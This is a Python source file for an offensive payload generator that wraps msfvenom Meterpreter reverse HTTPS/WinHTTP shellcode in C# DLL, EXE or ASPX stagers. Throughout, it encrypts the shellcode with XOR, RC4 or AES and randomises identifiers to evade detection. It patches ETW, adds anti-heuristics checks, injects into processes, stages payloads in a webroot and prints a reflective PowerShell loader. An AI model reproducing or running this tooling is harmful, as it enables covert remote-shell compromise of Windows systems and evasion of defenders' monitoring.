#!/bin/env python3
import ak
import os
import re
import random
import subprocess
import shutil
import argparse

# Words to use to randomize namespace, class, and function names
WORDS = open("/usr/share/dict/words").read().splitlines()
WORDS.remove('null')  # Causes issues with C#

# Randomly generate keys at runtime
XOR_KEY = os.urandom(1)
RC4_KEY = random.choice(WORDS).encode('utf-8')

# Randomize namespace and entrypoint names
CS_NAMESPACE = re.sub(r'\W+', '', random.choice(WORDS))
CS_CLASSNAME = re.sub(r'\W+', '', random.choice(WORDS))
CS_ENTRY_DLL = re.sub(r'\W+', '', random.choice(WORDS))

templates = {
  'cs': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;

namespace {cs_namespace}
{{
    public class {cs_classname}
    {{
    {imports}
        public static unsafe void {cs_entry}()
        {{
        {main_code}
        }}

    }}
}}
""",
  'aspx': """
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    {imports}
    protected void Page_Load(object sender, EventArgs e)
    {{
    {main_code}
    }}
</script>
  """
}

class Stager:
  def __init__(self,args):
    self.args = args
    self.encrypt = args.encrypt

    self.shellcode_fn = self.args.output + '.sc'

    # Set msfvenom flags
    if self.args.msfpayload == 'reverse_winhttp':
      self.msfvenom_cmd = f"msfvenom -p windows/x64/custom/reverse_winhttp LURI=/hello.woff LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
    elif self.args.msfpayload == 'reverse_https':
      self.msfvenom_cmd = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
    else:
      print("Invalid msfvenom type")
      sys.exit(1)

    if args.format == "dll":
      self.compiled = True
      self.source_fn = self.args.output + ".cs"
      self.compiled_fn = self.args.output + ".dll"
      self.cs_entrypoint = CS_ENTRY_DLL
      self.cs_namespace = CS_NAMESPACE
      self.cs_classname = CS_CLASSNAME
      self.compile_flags = f"/target:library /unsafe -out:{self.compiled_fn}"
    elif args.format == "exe":
      self.compiled = True
      self.source_fn = self.args.output + ".cs"
      self.compiled_fn = self.args.output + ".exe"
      self.cs_entrypoint = "Main"
      self.cs_namespace = CS_NAMESPACE
      self.cs_classname = CS_CLASSNAME
      self.compile_flags = f"/unsafe -out:{self.compiled_fn}"
    elif args.format == "aspx":
      self.compiled = False
      self.source_fn = self.args.output + ".aspx"
      self.compiled_fn = self.source_fn
    else:
      print("Unknown format. Exiting")
      sys.exit(1)

    self.generate_shellcode()

    # Only staged needs to be written to disk
    if not self.args.stageless:
      self.save_shellcode_to_file()

  def generate_shellcode(self):
    global XOR_KEY
    print(f"Generating shellcode with: {self.msfvenom_cmd}")
    if self.encrypt == 'xor':
      # Ensure XOR key is not null
      while XOR_KEY == b'\x00':
        XOR_KEY = os.urandom(1)

      print(f"Using XOR key {XOR_KEY}")
      self.shellcode = ak.ShellCode(self.msfvenom_cmd, xor_key=XOR_KEY)
    elif self.encrypt == 'rc4':
      if self.args.key != "":
        rc4_key = self.args.key.encode('utf-8')
      else:
        # Randomly generated
        rc4_key = RC4_KEY
      print(f"Using RC4 key {rc4_key}")
      self.shellcode = ak.ShellCode(self.msfvenom_cmd, rc4_key=rc4_key)
    elif self.encrypt == 'aes':
      if self.args.key != "":
        aes_key = self.args.key
      else:
        aes_key = "D(G+KbPeShVmYq3t"

      if self.args.iv != "":
        aes_iv = self.args.iv
      else:
        aes_iv = "8y/B?E(G+KbPeShV"
      print(f"Using AES key {aes_key} and IV {aes_iv}")
      self.shellcode = ak.ShellCode(self.msfvenom_cmd, aes_key=aes_key, aes_iv=aes_iv)

  def generate_stager_source(self):
    url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
    
    # Create obfuscator for loaders that need obfuscation
    exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
    path_obfuscated = ak.Obfuscator(exe_path, XOR_KEY)

    # P/Invoke code to import
    pinvoke_import_list = []
    # C# code to import
    imports = ""

    # Detect x64/x86
    imports += f"""{ak.ARCH_DETECTION}"""

    # Add staged or stageless code
    if self.args.stageless and self.shellcode is not None:
      # Stageless
      main_code = ak.SC_HARDCODED.format(enc_shellcode=self.shellcode.get_hex_csharp())
    else:
      # Staged
      main_code = f"""{url_dl_code}"""

    # Shellcode Decryption functions
    if self.encrypt == 'xor':
      main_code += ak.SC_XOR_DECODER.format(enc_key=self.shellcode.get_key_csharp())
    elif self.encrypt == 'rc4':
      # imports += ak.RC4_DECRYPT_IMPORT
      # main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
      pinvoke_import_list += ak.SC_SYS32_DECODER_PINVOKE_IMPORT
      imports += ak.SC_SYS32_DECODER_CODE_IMPORT
      main_code += ak.SC_SYS32_DECODER.format(enc_key=self.shellcode.get_key_ascii())
    elif self.encrypt == 'aes':
      imports += ak.AES_DECRYPT_IMPORT
      main_code += ak.SC_AES_DECODER.format(enc_key=self.shellcode.key.decode('utf-8'),
                                            enc_iv=self.shellcode.iv.decode('utf-8'))
    else:
      print("Invalid encryption format")
      sys.exit()

    if self.args.heuristics:
      pinvoke_import_list += ak.HEURISTICS_PINVOKE_IMPORT
      main_code += f"{ak.HEURISTICS_CODE}"

    if self.args.etw:
      pinvoke_import_list += ak.ETW_PINVOKE_IMPORT
      imports += f"{ak.ETW_CODE_IMPORT}"
      main_code += f"{ak.ETW_MAIN_CODE}"

    pinvoke_import_list += ak.import_choices_pinvoke_import[self.args.injection]

    # Get unique pinvoke imports and randomize
    pinvoke_import_list = list(set(pinvoke_import_list))
    random.shuffle(pinvoke_import_list)
    # Add pinvoke imports
    for p in pinvoke_import_list:
      imports += ak.get_pinvoke_import(p)

    imports += ak.import_choices_code_import[self.args.injection]
    main_code += ak.main_choices[self.args.injection].format(ak=ak,
                                                        xor_path=path_obfuscated.get_hex_csharp(),
                                                        xor_key=path_obfuscated.get_key_csharp(),
                                                        proc_name=self.args.process)

    # Make csharp template
    if self.args.format == "aspx":
      template = templates["aspx"].format(imports=imports,
                                               main_code=main_code,
                                               cs_namespace=CS_NAMESPACE,
                                               cs_classname=CS_CLASSNAME)

      # Must specify full namespace for DllImport for ASPX
      template = template.replace("DllImport","System.Runtime.InteropServices.DllImport")

      ak.write_file(self.source_fn, template)

    else:
      template = templates["cs"].format(imports=imports,
                                               main_code=main_code,
                                               cs_namespace=CS_NAMESPACE,
                                               cs_classname=CS_CLASSNAME,
                                               cs_entry=self.cs_entrypoint)
      ak.write_file(self.source_fn, template)

  def copy_to_webroot(self, src, dest=None):
    if dest is None:
      out = os.path.join(ak.WEBROOT_DIR, self.compiled_fn)
    else:
      out = os.path.join(ak.WEBROOT_DIR, dest)

    print(f"Copying {src} to {out}")
    shutil.copyfile(src, out)

  def run(self):
    self.generate_stager_source()
    
    if self.compiled:
      print("Compiling...")
      ak.cs_compile(self.source_fn, flags=self.compile_flags)
      print(f"Compiled {self.compiled_fn}")

      # Copy files to webroot
      print(f"*** Copying files to webroot {ak.WEBROOT_DIR}")
      self.copy_to_webroot(self.compiled_fn)
      self.copy_to_webroot(self.shellcode_fn, dest="sc")

      self.print_ps_loader()

  def save_shellcode_to_file(self):
    ak.write_file(self.shellcode_fn, self.shellcode.get_bytes())

  def print_ps_loader(self):
    t = ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST,
                                          tool=self.compiled_fn,
                                          entrypoint=self.cs_entrypoint,
                                          tool_namespace=self.cs_namespace,
                                          tool_classname=self.cs_classname,
                                          cmd="")

    if self.args.format == 'dll' or self.args.format == 'exe':
        print("Load with:")
        print(t)


def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('--injection', '-i', default='earlybird', choices=ak.main_choices.keys())
  parser.add_argument('--msfpayload', default='reverse_winhttp', choices=['reverse_winhttp', 'reverse_https'])
  parser.add_argument('--process', default='notepad', help="Process to create, or inject into")
  parser.add_argument('--format', '-f', default='dll', choices=['exe', 'dll', 'aspx'])
  parser.add_argument('--encrypt', '-e', default='rc4', choices=['xor', 'rc4', 'aes'])
  parser.add_argument('--key', default="", help="Key for AES or RC4")
  parser.add_argument('--iv', default="", help="IV for AES")
  parser.add_argument('--heuristics', default=True, action='store_true')
  parser.add_argument('--etw', default=True, action='store_true')
  parser.add_argument('--stageless', default=False, action='store_true')
  parser.add_argument('--output', '-o', default="win_msf_stager")


  args = parser.parse_args()

  s = Stager(args)

  s.run()


if __name__ == "__main__":
  main()
